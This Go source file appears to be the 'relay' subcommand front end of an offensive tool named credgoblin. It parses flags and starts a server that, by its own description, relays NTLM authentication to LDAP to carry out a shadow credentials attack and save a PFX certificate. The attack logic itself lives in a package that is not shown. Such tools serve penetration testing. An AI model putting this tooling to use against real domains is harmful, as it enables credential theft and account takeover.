package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/ineffectivecoder/credgoblin/pkg/config"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
	"github.com/ineffectivecoder/credgoblin/pkg/relay"
	"github.com/mjwhitta/cli"
)

func runRelay() {
	cfg := config.DefaultRelayConfig()

	// Configure CLI for relay subcommand
	cli.Banner = "credgoblin relay [OPTIONS]"
	cli.Info(
		"Relays NTLM authentication to LDAP and performs shadow credentials attack.",
		"This feature is planned for Phase 2.",
	)

	cli.Flag(
		&cfg.ListenAddr,
		"i", "interface",
		cfg.ListenAddr,
		"IP address to listen on.",
	)

	cli.Flag(
		&cfg.TargetURL,
		"t", "target",
		cfg.TargetURL,
		"Target LDAP URL (e.g., ldap://dc.domain.local).",
	)

	cli.Flag(
		&cfg.TargetUser,
		"u", "target-user",
		cfg.TargetUser,
		"Target user/computer DN to modify.",
	)

	cli.Flag(
		&cfg.OutputPath,
		"o", "output",
		cfg.OutputPath,
		"Output path for PFX certificate.",
	)

	cli.Flag(
		&cfg.PFXPassword,
		"P", "pfx-pass",
		cfg.PFXPassword,
		"PFX password (random if not set).",
	)

	cli.Flag(
		&cfg.Verbose,
		"v", "verbose",
		cfg.Verbose,
		"Enable verbose output.",
	)

	// Parse flags
	cli.Parse()

	// Validate required flags
	if cfg.TargetURL == "" {
		fmt.Println("Error: --target is required")
		fmt.Println()
		os.Exit(1)
	}

	if cfg.TargetUser == "" {
		fmt.Println("Error: --target-user is required")
		fmt.Println()
		os.Exit(1)
	}

	// Create logger
	logger := output.NewLogger(cfg.Verbose)

	// Print banner
	printBanner(logger)

	// Check if we have permission to bind to port 445
	if os.Geteuid() != 0 {
		logger.Warning("Not running as root - may fail to bind to port 445")
	}

	// Set default output path if not specified
	if cfg.OutputPath == "" {
		cfg.OutputPath = "certificate.pfx"
	}

	logger.Info(fmt.Sprintf("Target LDAP: %s", cfg.TargetURL))
	logger.Info(fmt.Sprintf("Target User: %s", cfg.TargetUser))
	logger.Info(fmt.Sprintf("Output PFX: %s", cfg.OutputPath))

	// Create relay config
	relayConfig := &relay.Config{
		ListenAddr:  cfg.ListenAddr,
		TargetURL:   cfg.TargetURL,
		TargetUser:  cfg.TargetUser,
		OutputPath:  cfg.OutputPath,
		PFXPassword: cfg.PFXPassword,
		Verbose:     cfg.Verbose,
	}

	// Create relay server
	server := relay.NewServer(relayConfig, logger)

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Handle signals for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-sigChan
		logger.Info("Shutting down...")
		cancel()
	}()

	// Start server
	if err := server.Start(ctx); err != nil {
		logger.Fatal(fmt.Sprintf("Failed to start relay server: %v", err))
	}

	logger.Info("Waiting for incoming connection to relay...")
	logger.Info("Press Ctrl+C to stop")

	// Wait for context cancellation
	<-ctx.Done()

	// Stop server
	if err := server.Stop(); err != nil {
		logger.Error(fmt.Sprintf("Error stopping server: %v", err))
	}

	logger.Info("Relay server stopped")
}
